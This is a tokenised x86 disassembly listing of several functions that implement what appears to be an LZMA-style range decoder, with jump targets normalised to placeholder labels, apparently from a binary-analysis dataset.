cdq
mov ecx 0x5
idiv ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
movzx eax [ ebp + 0xc ]
cdq
mov ecx 0x5
idiv ecx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
cmp edx 0x4
jle r-xdata
mov eax 0x9
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x7c ]
and ecx 0x1f
shl ecx 0x10
mov edx [ ebp + 0x8 ]
mov [ edx + 0x74 ] ecx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x7c ]
and ecx 0x7f
cmp ecx 0x2
jle r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0xc ] 0x6
mov [ ebp - 0xc ] 0x9
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov [ edx + 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x88 ] 0x0
mov eax 0x6
jmp r-xdata
mov eax 0x9
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x74 ] 0x0
jmp r-xdata
mov eax 0x9
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ecx
mov eax 0x1
jmp r-xdata
sub_4078d0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x24 ]
push eax
call sub_412c10
add esp 0xc
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
add eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x24 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
add ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x2c ] ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
sub edx [ ecx + 0x2c ]
cmp edx [ ebp + 0x10 ]
ja r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov [ eax + 0x30 ] edx
sub_407940
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp + 0x14 ]
mov [ edx ] 0x0
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x0
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x1
xor eax eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x78 ] 0x9
jne r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x78 ] 0x6
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0x18 ]
sub edx [ ecx ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x30 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x74 ]
cmp ecx [ ebp - 0x10 ]
ja r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x78 ] 0x7
je r-xdata
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x7c ]
and edx 0x80
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x74 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x30 ] 0x1
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x18 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x78 ] 0x6
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp + 0x14 ]
mov [ edx ] ecx
mov eax [ ebp + 0x10 ]
mov cl [ eax ]
mov [ ebp - 0x9 ] cl
movzx edx [ ebp - 0x9 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4076b0
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x78 ] eax
mov edx [ ebp + 0x10 ]
add edx 0x1
mov [ ebp + 0x10 ] edx
jmp r-xdata
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x3
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0x70 ]
jbe r-xdata
mov edx [ ebp + 0x8 ]
movzx eax [ edx + 0x7c ]
sar eax 0x5
and eax 0x3
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x78 ] 0x6
jne r-xdata
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x3
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x78 ] 0x8
je r-xdata
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp - 0x30 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40a260
add esp 0x18
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
add edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x70 ]
sub edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x70 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
sub edx [ ebp - 0x14 ]
mov [ ebp - 0x48 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x74 ]
sub ecx [ ebp - 0x48 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x74 ] ecx
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x38 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x70 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0x10 ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x7c ]
cmp edx 0x1
jne r-xdata
mov ecx [ ebp + 0x1c ]
cmp [ ecx ] 0x3
jne r-xdata
mov eax [ ebp - 0x38 ]
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x34 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x28 ] ecx
cmp [ ebp - 0x3c ] 0x0
jle r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] 0x0
jne r-xdata
mov edx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4078d0
add esp 0xc
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
add edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x74 ]
sub edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x74 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x74 ] 0x0
jne r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x84 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x88 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp + 0x1c ]
cmp [ eax ] 0x4
jne r-xdata
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40a120
add esp 0xc
mov edx [ ebp + 0x8 ]
mov [ edx + 0x80 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x84 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x78 ] 0x7
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x84 ] 0x0
je r-xdata
mov eax 0x1
jmp r-xdata
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x44 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x80 ] 0x0
push 0x0
mov edx [ ebp - 0x24 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40a120
add esp 0xc
mov eax 0x1
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov [ ecx ] 0x2
mov edx [ ebp + 0x1c ]
cmp [ edx ] 0x4
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x44 ]
mov [ edx + 0x78 ] eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x74 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x70 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x78 ] 0x0
sub_407d40
push ebp
mov ebp esp
sub esp 0xe4
mov [ ebp - 0x98 ] edx
mov [ ebp - 0x24 ] ecx
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x3c ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x2c ] eax
mov ecx 0x4
imul ecx ecx 0x0
mov edx [ ebp - 0x24 ]
mov eax [ edx + ecx + 0x38 ]
mov [ ebp - 0x44 ] eax
mov ecx 0x4
shl ecx 0x0
mov edx [ ebp - 0x24 ]
mov eax [ edx + ecx + 0x38 ]
mov [ ebp - 0x64 ] eax
mov ecx 0x4
shl ecx 0x1
mov edx [ ebp - 0x24 ]
mov eax [ edx + ecx + 0x38 ]
mov [ ebp - 0x6c ] eax
mov ecx 0x4
imul ecx ecx 0x3
mov edx [ ebp - 0x24 ]
mov eax [ edx + ecx + 0x38 ]
mov [ ebp - 0x7c ] eax
mov ecx [ ebp - 0x24 ]
mov edx 0x1
mov ecx [ ecx + 0x8 ]
shl edx cl
sub edx 0x1
mov [ ebp - 0xd8 ] edx
mov eax [ ebp - 0x24 ]
mov edx 0x1
mov ecx [ eax + 0x4 ]
shl edx cl
sub edx 0x1
mov [ ebp - 0xe0 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
mov [ ebp - 0xcc ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x54 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x60 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x2c ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x30 ]
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x28 ] 0x0
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x1c ]
mov [ ecx ] ax
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x3c ]
lea ecx [ eax + edx * 2 + 0x180 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x1c ]
movzx eax [ edx ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x3c ]
add eax 0xe6c
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x8
mov eax [ ebp - 0x18 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
cmp [ ebp - 0x40 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x5
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax 0x800
sub eax [ ebp - 0x8 ]
shr eax 0x5
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] ax
mov edx [ ebp - 0x2c ]
add edx 0xc
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x3c ]
add eax 0x664
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov [ ebp - 0xb0 ] edx
mov ecx [ ebp - 0x60 ]
mov [ ebp - 0xb0 ] ecx
jmp r-xdata
cmp [ ebp - 0x2c ] 0x7
jae r-xdata
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax * 2 + 0x198 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
movzx ecx [ eax ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
movzx eax [ edx ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x44 ]
jae r-xdata
cmp [ ebp - 0x2c ] 0x4
jae r-xdata
mov eax [ ebp - 0x40 ]
and eax [ ebp - 0xe0 ]
mov ecx [ ebp - 0xcc ]
shl eax cl
mov ecx [ ebp - 0x54 ]
add ecx [ ebp - 0xb0 ]
movzx edx [ ecx - 0x1 ]
mov ecx 0x8
sub ecx [ ebp - 0xcc ]
sar edx cl
add eax edx
imul eax eax 0x300
mov ecx [ ebp - 0x1c ]
lea edx [ ecx + eax * 2 ]
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x8
mov eax [ ebp - 0x18 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xc8 ] 0x0
mov eax [ ebp - 0x60 ]
mov [ ebp - 0xc8 ] eax
jmp r-xdata
mov [ ebp - 0xa8 ] 0x3
mov eax [ ebp - 0x2c ]
mov [ ebp - 0xa8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x5
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax * 2 + 0x1b0 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
movzx ecx [ eax ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x2c ]
shl eax 0x4
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax * 2 + 0x1e0 ]
mov eax [ ebp - 0x78 ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x1c ]
movzx eax [ edx ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x38 ]
mov [ eax ] dx
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
movzx eax [ edx ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax 0x800
sub eax [ ebp - 0x8 ]
shr eax 0x5
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx ] ax
mov edx [ ebp - 0x78 ]
shl edx 0x3
mov eax [ ebp - 0x1c ]
lea ecx [ eax + edx * 2 + 0x4 ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x88 ] 0x0
mov [ ebp - 0x70 ] 0x8
jmp r-xdata
mov [ ebp - 0x9c ] 0x6
mov [ ebp - 0x9c ] 0x3
jmp r-xdata
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x44 ]
add ecx [ ebp - 0xc8 ]
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x14 ]
movzx ecx [ eax + ecx ]
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0x68 ] 0x100
cmp [ ebp - 0x2c ] 0xa
jae r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0xa8 ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x34 ] 0x1
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x8
mov eax [ ebp - 0x18 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x8
mov eax [ ebp - 0x18 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x28 ] 0x1
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x2c ]
sub edx [ ebp - 0x9c ]
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x34 ] 0x1
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x34 ] ecx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x1c ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp - 0x34 ]
add ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x5
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax * 2 + 0x1c8 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
movzx ecx [ eax ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x84 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x1c ]
mov [ eax ] dx
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax 0x800
sub eax [ ebp - 0x8 ]
shr eax 0x5
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] ax
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x44 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x38 ]
mov [ eax ] dx
mov ecx [ ebp - 0x1c ]
add ecx 0x204
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x88 ] 0x10
mov [ ebp - 0x70 ] 0x100
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax 0x800
sub eax [ ebp - 0x8 ]
shr eax 0x5
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx ] ax
mov edx [ ebp - 0x78 ]
shl edx 0x3
mov eax [ ebp - 0x1c ]
lea ecx [ eax + edx * 2 + 0x104 ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x88 ] 0x8
mov [ ebp - 0x70 ] 0x8
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
